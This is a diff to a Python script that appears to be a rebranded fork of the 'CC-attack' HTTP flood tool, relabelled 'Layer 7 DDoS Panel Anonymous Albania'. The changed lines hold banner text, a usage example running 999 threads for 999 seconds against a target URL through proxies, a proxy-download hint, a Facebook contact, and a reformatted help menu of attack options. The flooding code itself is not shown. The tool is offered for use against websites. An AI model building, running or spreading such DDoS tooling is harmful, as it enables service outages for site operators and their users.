@@ -18,16 +18,14 @@ import os
 
 
 print ('''
-               \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
-                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mMirseerdhet tek LySDDoS Panel       \x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - -  \x1b[38;2;239;239;239mPaneli DDoS Falas 2022\x1b[38;2;0;212;14m - - - - - -\x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
-                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
-                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239m       KosovaHackingCommunity      \x1b[38;2;0;49;147m║
-                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
-                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
-                \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239mShkruaj ndihm per te pare te gjitha komandat.\x1b[38;2;0;49;147m║
-                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝''')
+                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m═~
+                \x1b[38;2;0;212;14m║ Welcome L7DPAA -={Layer 7 DDoS Panel Anonymous Albania}=- by \x1b[38;2;0;212;14mAlb[E]rTTz & \x1b[38;2;0;49;147Th3Los3Ra.K.a
+                \x1b[38;2;0;212;14m║ Usage: python3 cc.py -url https://example.com -m cc -v 5 -t 999 -f proxy.txt -s 999 -check
+                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════~
+                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════~
+                \x1b[38;2;0;212;14m║ IF YOU DON'T HAVE A PROXY YOU CAN DOWNLOAD THEM AUTOMATICALLY WITH THE COMMAND PYTHON3 CC.PY -DOWN 
+                \x1b[38;2;0;212;14m║ If you need help, contact us on fb: https://www.facebook.com/Alb3rtTTz/
+                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════~''')
 
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
@@ -565,22 +563,22 @@ def DownloadProxies(proxy_ver):
 	print("> Have already downloaded proxies list as "+out_file)
 
 def PrintHelp():
-	print('''===============  CC-attack help list  ===============
-   -h/help   | showing this message
-   -url      | set target url
-   -m/mode   | set program mode
-   -data     | set post data path (only works on post mode)
-             | (Example: -data data.json)
-   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
-   -v        | set proxy type (4/5/http, default:5)
-   -t        | set threads number (default:800)
-   -f        | set proxies file (default:proxy.txt)
-   -b        | enable/disable brute mode
-             | Enable=1 Disable=0  (default:0)
-   -s        | set attack time(default:60)
-   -down     | download proxies
-   -check    | check proxies
-=====================================================''')
+	print('''╔════════════════════════════════════════════╗
+   ║-h/help   | showing this message║
+   ║-url      | set target url║
+   ║-m/mode   | set program mode║
+   ║-data     | set post data path (only works on post mode)║
+   ║          | (Example: -data data.json)║
+   ║-cookies  | set cookies (Example: 'id:xxx;ua:xxx')║
+   ║-v        | set proxy type (4/5/http, default:5)║
+   ║-t        | set threads number (default:800)║
+   ║-f        | set proxies file (default:proxy.txt)║
+   ║-b        | enable/disable brute mode║
+   ║          | Enable=1 Disable=0  (default:0)║
+   ║-s        | set attack time(default:60)║
+   ║-down     | download proxies║
+   ║-check    | check proxies║
+╚════════════════════════════════════════════╝''')
 
 
 def main():
